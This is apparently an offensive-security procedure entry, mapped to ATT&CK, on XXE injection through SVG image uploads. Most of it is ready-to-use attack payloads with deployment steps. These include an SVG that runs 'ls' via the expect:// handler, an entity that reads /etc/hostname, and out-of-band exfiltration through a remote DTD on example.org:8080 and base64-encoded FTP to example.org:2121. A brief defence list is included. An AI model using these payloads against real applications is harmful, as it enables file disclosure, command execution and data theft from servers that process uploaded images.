---
id: 25da68fb-d920-4621-9b25-0e5e543759d7
name: XXE-Injection-via-SVG-Image
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.565164+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/XML External Entity]]'
  - '[[tags/XXE in exotic files]]'
  - '[[tags/XXE inside SVG]]'
  - xxe
  - svg
  - file-read
  - oob-exfil
commands:
  - '[[commands/generate-svg-xxe-directory-listing]]'
  - '[[commands/generate-svg-xxe-oob-rasterization]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# XXE-Injection-via-SVG-Image

## Summary

XXE Injection via SVG Image exploits XML external entity processing vulnerabilities by embedding malicious entities within SVG files. When the SVG is parsed by a vulnerable application or client (e.g., a web browser or image viewer), it can lead to file disclosure, command execution, or out-of-band data exfiltration. This procedure outlines creating and deploying such payloads for discovery and collection on target systems.

## Description

This technique targets applications that parse SVG files without disabling external entity resolution, allowing attackers to define entities that reference local files or remote resources. By crafting an SVG with XXE payloads, an attacker can trick the parser into reading sensitive files like /etc/hostname, listing directories via protocol handlers, or sending data to an attacker-controlled server via OOB channels like HTTP or FTP. It is effective against web applications that process user-uploaded images or clients that render SVGs insecurely. Success depends on the parser's configuration; modern browsers mitigate this, but legacy apps or servers (e.g., image processing libraries) remain vulnerable. The attack enables initial discovery of system details, paving the way for further exploitation.

## Requirements

1. Ability to upload or deliver the SVG file to the target application or victim client.
2. Vulnerable XML parser that resolves external entities (e.g., libxml2 without DTD disabling).
3. For OOB exfiltration: Attacker-controlled server (e.g., HTTP listener on port 8080 or FTP on 2121).
4. Basic knowledge of the target's file system paths (e.g., Linux /etc/hostname).
5. Tools for file creation (e.g., text editor or bash echo).

## Defense

- Disable external entity processing in XML parsers (e.g., set LIBXML_NOXXE in PHP or use secure flags in Java).
- Implement input validation to reject or sanitize SVG uploads, stripping DOCTYPE declarations.
- Use Content Security Policy (CSP) to restrict resource loading in web contexts.
- Monitor for anomalous network traffic, such as unexpected outbound connections to attacker IPs or file reads via logs.
- Employ web application firewalls (WAFs) to detect XXE patterns in uploads.

## Objectives

1. Retrieve system information, such as hostname or directory listings.
2. Execute commands on the target system via protocol handlers.
3. Exfiltrate sensitive data to an attacker-controlled endpoint.

## Instructions

### Step 1: Generate Directory Listing Payload Using Expect Protocol

**Context**: Create an SVG payload that uses the 'expect://' protocol handler to execute a directory listing command when parsed. This step accomplishes basic file and directory discovery on the target.

**Command** ([[commands/generate-svg-xxe-directory-listing]]):
```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>' > payload.svg
```

> This generates an SVG file embedding the XXE payload from [[codes/SVG-XXE-List-Directory-Using-Expect]]. Upload the payload.svg to the target application or send it to the victim. When opened in a vulnerable client, it attempts to execute 'ls' and may display or log the output. Verify by checking if directory contents are reflected in the application's response or client behavior.

### Step 2: Generate Hostname File Read Payload

**Context**: Craft an SVG that defines an external entity to read the /etc/hostname file, disclosing system identification details. This aids in discovery of the target's environment.

Use the payload from [[codes/SVG-XXE-Read-Hostname-File]] to create the SVG:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

> Save this as hostname.svg and inject into the target. Upon parsing, the hostname content replaces the entity in the text element. Expected output includes the hostname string in the rendered SVG or response.

### Step 3: Generate OOB Exfiltration Payload via Rasterization

**Context**: Build an SVG that triggers an out-of-band request during rasterization, allowing data exfiltration to a remote server. This step enables collection of internal data without direct reflection.

**Command** ([[commands/generate-svg-xxe-oob-rasterization]]):
```bash
echo '<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>' > oob.svg
```

> This uses the payload from [[codes/SVG-XXE-OOB-Exfiltration-via-Rasterization]]. Replace 'http://example.org:8080/xxe.xml' with your listener. Upload oob.svg; during processing, it fetches the remote DTD, enabling exfil. Monitor your server for the incoming request containing data.

### Step 4: Generate Base64 Encoded FTP Exfiltration Payload

**Context**: Define entities for reading a file, base64 encoding it, and exfiltrating via FTP. This accomplishes secure data collection from the target.

Use the payload from [[codes/XXE-Base64-Encode-and-FTP-Exfil-Payload]] in a full SVG DOCTYPE:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

> Embed these entities in an SVG DOCTYPE and inject. The parser reads /etc/hostname, encodes it, and sends to your FTP server. If the file is accessible, receive the base64 data; decode to retrieve the hostname. Adjust path and protocol as needed.
